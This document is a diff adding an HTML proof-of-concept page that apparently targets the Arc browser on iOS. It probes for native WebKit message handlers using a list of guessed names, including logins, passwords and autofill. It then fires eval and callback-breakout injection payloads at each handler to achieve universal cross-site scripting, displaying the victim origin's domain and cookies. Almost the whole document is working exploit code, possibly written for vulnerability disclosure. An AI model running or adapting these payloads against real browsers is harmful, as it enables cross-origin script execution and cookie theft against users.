@@ -1,0 +1,75 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Arc iOS UXSS — messageHandler bridge probe</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:20px;line-height:1.55}
+  button{background:#d92d20;color:#fff;border:0;border-radius:8px;padding:12px 18px;font-size:15px;font-weight:600;cursor:pointer;margin:4px 6px 4px 0}
+  #handlers{background:#eef6ff;border:1px solid #bcd;border-radius:8px;padding:10px 12px;margin:12px 0;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;word-break:break-word}
+  #log{white-space:pre-wrap;background:#0f1115;color:#d7e0ea;border-radius:8px;padding:10px 12px;font-family:ui-monospace,Menlo,monospace;font-size:12px;min-height:50px;margin-top:10px}
+  code{background:#eee;padding:1px 4px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>Arc iOS UXSS bridge probe</h1>
+<p>Step 1 lists the native <code>window.webkit.messageHandlers</code> reachable from this frame. Step 2 fires abuse payloads (eval + callback-breakout) at each. Success = an alert <b>pwned by 33x @ &lt;victim origin&gt;</b> (a first-party/top origin, not this page).</p>
+<button onclick="enumerate()">1 · Enumerate handlers</button>
+<button onclick="abuse()">2 · Fire abuse payloads</button>
+<div id="handlers">handlers: (tap Enumerate)</div>
+<div id="log">ready.</div>
+
+<script>
+function show(id,m){ document.getElementById(id).textContent = m; }
+function log(m){ var e=document.getElementById('log'), d=document.createElement('div'); d.textContent=m; e.appendChild(d); }
+
+// candidate handler names Arc plausibly injects (reader/AI/find/favicon/shields/autofill/webauthn/playlist/etc.)
+var GUESSES = ['reader','readability','readerMode','findInPage','find','faviconExtraction','favicon','themeColor','metadata','pageMetadata','summarize','summary','askOnPage','browseForMe','ai','aiChat','assistant','tracking','trackingProtection','shields','adblock','contentBlocker','autoconsent','cosmetic','autofill','loginsManager','logins','passwords','fido','u2f','webauthn','playlist','media','mediaSession','oembed','downloadManager','downloads','contextMenu','translate','translation','selection','share','sharing','logging','log','console','analytics','telemetry','arc','arcSearch','arcBridge','bridge','nativeBridge','jsBridge','messageBridge','__arc','ArcJS','boost','boosts','navigation','lifecycle','scroll','focus'];
+
+function bridge(){
+  var mh = window.webkit && window.webkit.messageHandlers;
+  var list = [];
+  if(mh){
+    try{ for(var k in mh){ if(list.indexOf(k)<0) list.push(k); } }catch(e){}
+    try{ Object.getOwnPropertyNames(mh).forEach(function(k){ if(list.indexOf(k)<0) list.push(k); }); }catch(e){}
+    GUESSES.forEach(function(n){ try{ if(mh[n] && typeof mh[n].postMessage==='function' && list.indexOf(n)<0) list.push(n); }catch(e){} });
+  }
+  return { mh: mh, list: list };
+}
+
+function enumerate(){
+  var b = bridge();
+  if(!b.mh){ show('handlers','handlers: window.webkit.messageHandlers NOT present in this frame (no bridge exposed here).'); return; }
+  show('handlers', 'reachable handlers ('+b.list.length+'): ' + (b.list.join(', ') || '(none enumerable — abuse still tries guesses)'));
+}
+
+function abuse(){
+  var b = bridge();
+  if(!b.mh){ log('no bridge in this frame.'); return; }
+  var P = "alert('pwned by 33x @ '+document.domain+' :: '+document.cookie)";
+  var payloads = [
+    { type:'eval', code:P },
+    { type:'evaluate', javascript:P },
+    { type:'executeJavaScript', script:P },
+    { method:'eval', args:[P] },
+    { name:'eval', body:P },
+    { id:"');"+P+"//" },
+    { callback:"x'));"+P+"//" },
+    { requestId:"1", version:"');"+P+"//" },
+    P
+  ];
+  var names = b.list.length ? b.list : GUESSES;
+  var n = 0;
+  names.forEach(function(h){
+    payloads.forEach(function(p){
+      try{ b.mh[h].postMessage(p); n++; }catch(e){}
+    });
+  });
+  log('fired '+n+' payload(s) across '+names.length+' handler(s). If any replies via evaluateJavaScript, "pwned by 33x @ <victim origin>" alerts.');
+}
+
+window.addEventListener('load', enumerate);
+</script>
+</body>
+</html>
